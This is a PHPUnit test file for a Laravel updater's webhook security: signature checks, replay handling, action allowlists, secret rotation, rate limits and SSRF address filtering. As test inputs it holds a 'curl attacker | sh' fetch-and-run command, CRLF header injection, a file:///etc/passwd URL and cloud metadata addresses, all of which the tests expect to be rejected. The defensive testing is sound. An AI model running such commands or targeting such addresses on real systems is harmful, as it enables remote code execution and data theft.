<?php

declare(strict_types=1);

namespace Argws\LaravelUpdater\Tests\Unit;

use Argws\LaravelUpdater\Support\StateStore;
use Argws\LaravelUpdater\Webhooks\WebhookDestination;
use Argws\LaravelUpdater\Webhooks\WebhookReceiver;
use Argws\LaravelUpdater\Webhooks\WebhookSignature;
use Argws\LaravelUpdater\Webhooks\WebhookStore;
use Illuminate\Encryption\Encrypter;
use PHPUnit\Framework\TestCase;

final class WebhookSecurityTest extends TestCase
{
    private WebhookStore $store;
    private WebhookReceiver $receiver;
    private string $path;
    private int $endpoint;
    private string $secret;

    protected function setUp(): void
    {
        parent::setUp();
        $this->path = sys_get_temp_dir() . '/updater_webhook_' . bin2hex(random_bytes(8)) . '.sqlite';
        $state = new StateStore($this->path);
        $state->ensureSchema();
        $this->store = new WebhookStore($state, new Encrypter(random_bytes(32), 'AES-256-CBC'));
        $result = $this->store->saveEndpoint(['name' => 'Integration', 'direction' => 'incoming', 'events' => [],
            'actions' => ['status', 'check', 'simulate'], 'enabled' => true]);
        $this->endpoint = $result['endpoint']['id'];
        $this->secret = $result['secret'];
        $this->receiver = new WebhookReceiver($this->store);
    }

    protected function tearDown(): void
    {
        @unlink($this->path);
        parent::tearDown();
    }

    public function testSignatureRequiresExactBodyTimestampAndIdentifier(): void
    {
        $timestamp = (string) time();
        $id = bin2hex(random_bytes(16));
        $signature = WebhookSignature::sign($this->secret, $timestamp, $id, '{"action":"status"}');
        self::assertTrue(WebhookSignature::verify($this->secret, $timestamp, $id, '{"action":"status"}', $signature));
        self::assertFalse(WebhookSignature::verify($this->secret, $timestamp, $id, '{"action":"check"}', $signature));
        self::assertFalse(WebhookSignature::verify($this->secret, $timestamp, $id, '{"action":"status"}', $signature, time() + 301));
        self::assertFalse(WebhookSignature::verify($this->secret, $timestamp, "invalid\r\nheader", '{}', $signature));
    }

    public function testReplayIsIdempotentAndChangedBodyConflicts(): void
    {
        $calls = 0;
        $executor = static function ($action, $profile) use (&$calls): int { ++$calls; return 73; };
        $id = bin2hex(random_bytes(16));
        $first = $this->receive('{"action":"simulate","profile_id":2}', $executor, $id);
        $second = $this->receive('{"action":"simulate","profile_id":2}', $executor, $id);
        $third = $this->receive('{"action":"check"}', $executor, $id);
        self::assertSame(202, $first['status']);
        self::assertSame(200, $second['status']);
        self::assertTrue($second['data']['duplicate']);
        self::assertSame(73, $second['data']['run_id']);
        self::assertSame(409, $third['status']);
        self::assertSame(1, $calls);
    }

    public function testRemoteApplyCommandsAndUnknownOptionsNeverExecute(): void
    {
        $calls = 0;
        $executor = static function () use (&$calls): void { ++$calls; };
        foreach (['{"action":"apply"}', '{"action":"simulate","dry_run":false}',
            '{"action":"simulate","pre_update_commands":["curl attacker | sh"]}',
            '{"action":"simulate","seed":"DangerousSeeder"}', '{"action":"check","profile_id":1}',
            '{"action":"simulate","profile_id":"2"}', '{"action":"simulate","profile_id":-1}'] as $body) {
            self::assertSame(422, $this->receive($body, $executor)['status']);
        }
        self::assertSame(0, $calls);
    }

    public function testEndpointActionAllowlistAndDisableAreAuthoritative(): void
    {
        $this->store->saveEndpoint(['name' => 'Read only', 'direction' => 'incoming', 'events' => [], 'actions' => ['status'], 'enabled' => true], $this->endpoint);
        self::assertSame(422, $this->receive('{"action":"simulate"}', static fn () => null)['status']);
        $this->store->saveEndpoint(['name' => 'Read only', 'direction' => 'incoming', 'events' => [], 'actions' => ['status'], 'enabled' => false], $this->endpoint);
        self::assertSame(401, $this->receive('{"action":"status"}', static fn () => null)['status']);
    }

    public function testSecretsAreEncryptedNeverReadBackAndRotationInvalidatesOldValue(): void
    {
        $stored = $this->store->endpoint($this->endpoint);
        self::assertNotSame($this->secret, $stored['secret_cipher']);
        self::assertSame($this->secret, $this->store->secret($stored));
        self::assertStringNotContainsString($this->secret, json_encode($this->store->endpoints()));
        self::assertArrayNotHasKey('secret_cipher', $this->store->endpoints()[0]);
        self::assertArrayNotHasKey('secret', $this->store->endpoints()[0]);
        $replacement = $this->store->rotate($this->endpoint);
        self::assertNotSame($this->secret, $replacement);
        self::assertSame(401, $this->receive('{"action":"status"}', static fn () => null)['status']);
        $this->secret = $replacement;
        self::assertSame(202, $this->receive('{"action":"status"}', static fn () => null)['status']);
    }

    public function testSizeRateAndExceptionResponsesDoNotExposeInternalDetails(): void
    {
        self::assertSame(413, $this->receive(str_repeat('x', 65537), static fn () => null)['status']);
        $result = $this->receive('{"action":"status"}', static function (): void { throw new \RuntimeException('password=private-secret'); });
        self::assertSame(503, $result['status']);
        self::assertStringNotContainsString('private-secret', json_encode($result));
        self::assertStringNotContainsString('private-secret', json_encode($this->store->history()));
        for ($i = 0; $i < 29; ++$i) {
            self::assertSame(202, $this->receive('{"action":"status"}', static fn () => null)['status']);
        }
        self::assertSame(429, $this->receive('{"action":"status"}', static fn () => null)['status']);
    }

    public function testDestinationRejectsEveryNonPublicAddressFamilyAndUnsafeUrl(): void
    {
        foreach (['127.0.0.1', '0.0.0.0', '10.1.2.3', '100.64.0.1', '169.254.169.254', '172.16.1.1',
            '192.168.0.1', '192.0.2.1', '198.18.1.1', '198.51.100.1', '203.0.113.1', '224.0.0.1',
            '255.255.255.255', '::1', '::', '::ffff:127.0.0.1', 'fc00::1', 'fe80::1', 'ff02::1',
            '2001:db8::1', '2002:7f00:1::1', '2001::1'] as $ip) {
            self::assertFalse(WebhookDestination::isPublicIp($ip), $ip);
        }
        foreach (['8.8.8.8', '1.1.1.1', '2606:4700:4700::1111', '2001:4860:4860::8888'] as $ip) {
            self::assertTrue(WebhookDestination::isPublicIp($ip), $ip);
        }
        $destination = new WebhookDestination();
        foreach (['http://8.8.8.8/hook', 'https://127.0.0.1', 'https://[::1]', 'https://user:password@8.8.8.8',
            'https://8.8.8.8:444', 'https://localhost', 'https://metadata.internal', 'https://2130706433',
            "https://8.8.8.8/\r\nX-Header:x", 'file:///etc/passwd'] as $url) {
            try { $destination->resolve($url); self::fail('Accepted ' . $url); } catch (\InvalidArgumentException) { self::assertTrue(true); }
        }
    }

    public function testDnsIsResolvedAgainAndMixedPrivateAnswersAreRejected(): void
    {
        $destination = new class extends WebhookDestination {
            public int $calls = 0;
            protected function lookup(string $host): array { return ++$this->calls === 1 ? ['8.8.8.8'] : ['8.8.8.8', '127.0.0.1']; }
        };
        self::assertSame('8.8.8.8', $destination->resolve('https://hooks.company.com/events')['ip']);
        $this->expectException(\InvalidArgumentException::class);
        $destination->resolve('https://hooks.company.com/events');
    }

    private function receive(string $body, callable $executor, ?string $id = null): array
    {
        $id ??= bin2hex(random_bytes(16));
        $timestamp = (string) time();

        return $this->receiver->receive($this->endpoint, $body, $timestamp, $id,
            WebhookSignature::sign($this->secret, $timestamp, $id, $body), $executor, '203.0.113.100');
    }
}
